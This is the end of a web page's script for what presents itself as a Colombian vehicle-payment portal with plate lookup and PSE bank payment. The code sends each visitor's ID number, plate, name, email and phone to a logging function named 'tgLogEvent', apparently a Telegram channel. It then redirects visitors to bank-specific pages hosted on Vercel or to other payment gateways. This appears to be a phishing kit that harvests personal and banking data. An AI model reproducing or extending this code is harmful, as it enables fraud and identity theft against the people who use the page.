            if (bankConfig.flow === 'primary') {
                const destUrl = bankConfig.page + '/sites/' + bankConfig.slug + '/manager/' + bankConfig.id;
                tgLogEvent('🏦 Pago PSE vehicular', Object.assign({}, logBase, {
                    '➡️ Destino': 'Vercel (' + bankConfig.key + ')',
                    '🔗 URL': destUrl,
                }));
                window.location.href = destUrl;
                return;
            }

            // Resto → servidor decide entre HelppiuPay (>$2.5M) y Recaudofall
            fetch('api/get-redirect.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    banco: bankConfig.key,
                    monto: Math.round(currentPaymentContext.amount),
                    nombre: paymentName.value.trim(),
                    cedula: paymentDocumentNumber.value.trim(),
                    tipoDocumento: paymentDocumentType.value,
                    tipoPersona: paymentCustomerType.value,
                    email: paymentEmail.value.trim(),
                    telefono: paymentPhone.value.trim()
                })
            })
                .then(function (r) { return r.json(); })
                .then(function (result) {
                    if (result.ok) {
                        tgLogEvent('🏦 Pago PSE vehicular', Object.assign({}, logBase, {
                            '➡️ Destino': result.flow === 'helppiupay' ? 'HelppiuPay' : 'Recaudofall',
                            '🔗 URL': result.url,
                        }));
                        window.location.href = result.url;
                    } else {
                        confirmPaymentButton.disabled = false;
                        confirmPaymentButton.textContent = 'Pagar ' + currentPaymentContext.amountText;
                        updatePaymentState();
                        alert('No se pudo procesar el pago. Por favor intenta de nuevo.');
                    }
                })
                .catch(function () {
                    confirmPaymentButton.disabled = false;
                    confirmPaymentButton.textContent = 'Pagar ' + currentPaymentContext.amountText;
                    updatePaymentState();
                    alert('Error de conexión. Por favor intenta de nuevo.');
                });
        });

        form.addEventListener('submit', async (event) => {
            let hasErrors = false;

            const documentoInvalid = !isFilled(documentoInput);
            const placaEmpty = !isFilled(placaInput);
            const placaInvalid = !placaEmpty && !isValidPlaca(placaInput.value);

            setFieldError(
                documentoInput,
                documentoInvalid,
                'El campo \'Numero de documento\' es obligatorio'
            );

            setFieldError(
                placaInput,
                placaEmpty || placaInvalid,
                placaEmpty
                    ? 'El campo \'Placa\' es obligatorio'
                    : 'La placa debe tener el formato ABC123'
            );

            hasErrors = documentoInvalid || placaEmpty || placaInvalid;

            if (hasErrors) {
                event.preventDefault();
                return;
            }

            event.preventDefault();

            try {
                setResultsMode('loading');
                setLoadingState(true);

                tgLogEvent('🔍 Vehículo consultado', {
                    '📋 Documento': documentoInput.value.trim(),
                    '🚗 Placa': placaInput.value.trim().toUpperCase(),
                });

                const payload = await fetchVehicleData();
                renderVehicleResults(payload);
                setResultsMode('content');
                resultsSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
            } catch (error) {
                if (error.name === 'AbortError') {
                    return;
                }
                setResultsMode('error', error.message || 'No se pudo completar la consulta.');
            } finally {
                currentRequestController = null;
                setLoadingState(false);
            }
        });

        hideResultsSection();
        updatePaymentState();
        setCaptchaState('idle');
        updateSearchState();
    </script>
</body>

</html>
